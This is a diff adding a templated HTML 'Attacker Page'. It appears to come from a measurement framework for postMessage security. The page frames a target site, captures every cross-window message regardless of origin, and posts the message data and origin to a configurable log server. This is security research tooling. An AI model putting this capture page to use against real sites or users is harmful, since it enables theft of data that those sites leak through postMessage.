@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<title></title>
+</head>
+<body>
+<h1> Attacker Pape</h1>
+
+<h2>Target Iframe </h2>
+<iframe id="targetFrame" src="{{ iframe_uri }}" style="height:500px;width:1000px;"></iframe>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
+<script type="text/javascript">
+	window.logMessage = {
+			"url": "{{ iframe_uri }}", 
+			"siteId": "{{ iframe_uri_pk }}",
+			"runHashId": "{{ runHashId }}",
+			"state_status": "{{ state_status }}",
+			"opentype": "0",
+			"message": ""
+	}
+	window.addEventListener("message", receiveMessageListener, false);
+
+	function sendLogMessage(logMessage){
+		var log_endpoint = "{{ log_server_endpoint }}";
+	    request = $.ajax({
+	        url: log_endpoint,
+	        contentType: "application/json; charset=utf-8",
+	        type: "post",
+	        data: JSON.stringify(logMessage),
+	        dataType: 'text',
+	        crossDomain: true,
+	    });
+
+	    // Callback handler that will be called on success
+	    request.done(function (response, textStatus, jqXHR){
+	        console.log("message sent to log server");
+	        console.log(response)
+	    });
+
+	    // Callback handler that will be called on failure
+	    request.fail(function (jqXHR, textStatus, errorThrown){
+	        console.error(
+	            "The following error occurred: "+
+	            textStatus, errorThrown
+	        );
+	    });
+
+	    // Callback handler that will be called regardless
+	    // if the request failed or succeeded
+	    request.always(function () {
+	    });
+	}
+
+	function receiveMessageListener(event){
+		console.log('[PostMessageMessageListener] Captured Message!')
+		var state_status = "{{ state_status }}";
+		var opentype = "frame"; 
+		var logMessage = {
+			"url": "{{ iframe_uri }}", 
+			"siteId": "{{ iframe_uri_pk }}",
+			"runHashId": "{{ runHashId }}",
+			"state_status": state_status,
+			"opentype": "0",
+			"message": JSON.stringify({ "opentype": opentype, "messageData": event.data, "messageOrigin": event.origin}),
+		}
+		window.logMessage = logMessage;
+		sendLogMessage(logMessage);
+	}
+
+	// wait for 10 seconds and if received no messages, send the empty message
+	setTimeout(function() {
+		if(window.logMessage.message == ""){
+			sendLogMessage(window.logMessage);
+		}
+    }, 10000);
+	
+</script>
+</body>
+</html>
